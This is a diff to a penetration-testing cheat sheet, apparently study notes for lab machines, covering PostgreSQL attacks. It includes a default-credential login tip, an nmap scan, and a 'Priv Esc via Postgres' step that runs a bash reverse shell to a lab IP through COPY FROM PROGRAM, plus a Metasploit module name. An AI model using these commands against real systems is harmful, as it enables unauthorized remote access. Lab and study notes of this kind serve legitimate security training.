@@ -842,13 +842,15 @@ xfreerdp /u:bill /p:Password! /v:10.11.1.111
 ```
 
 ## PostgreSQL - 5432/5433
-REF: Nibbles, Splodge
 
-https://book.hacktricks.xyz/pentesting/pentesting-postgresql
 
-https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce-from-version-9.3
+	https://book.hacktricks.xyz/pentesting/pentesting-postgresql
+	https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce-from-version-9.3
 
 ```
+	Try logging in as postgres:postgres
+	Scan: nmap -p 5432 192.168.234.140 -A -sV -T4
+	
 psql -U <myuser> # Open psql console with user
 psql -h <host> -U <username> -d <database> # Remote connection
 psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
@@ -860,7 +862,10 @@ psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connect
 Priv Esc via Postgres
 
 CREATE TABLE cmd(cmd_output text); 
-COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/192.168.49.114/80 0>&1'; 
+COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/192.168.49.114/80 0>&1';
+
+Metasploit Shell:
+	multi/postgres/postgres_copy_from_program_cmd_exec
 ```
 ## Erland Port Mapper - 4369
 https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd
